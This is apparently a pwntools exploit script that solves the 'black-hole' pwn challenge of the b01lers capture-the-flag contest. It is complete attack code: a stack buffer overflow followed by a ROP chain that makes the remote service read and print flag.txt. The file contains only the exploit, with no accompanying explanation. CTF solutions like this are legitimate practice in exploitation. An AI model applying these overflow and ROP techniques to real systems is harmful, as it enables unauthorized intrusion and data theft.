#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
e = ELF('./black-hole')
r = remote('pwn.ctf.b01lers.com', 1005)
#r = process(e.path)
#context.terminal=['tmux', 'splitw', '-h']
#gdb.attach(r, gdbscript='''b*400cc4''')

pop_rdi_ret = 0x0000000000400dc3
payload = "A"*140 + "\x97"
payload += p64(pop_rdi_ret)
payload += p64(0x400e52) # ./flag.txt
payload += p64(e.symbols['readFile'])
payload += p64(0x400bd0) # puts(flag)
r.sendlineafter("Captain's Name: ",payload)
for i in range(8):
    r.sendlineafter('|\n> ', 'd')
    sleep(1)

print r.recv()
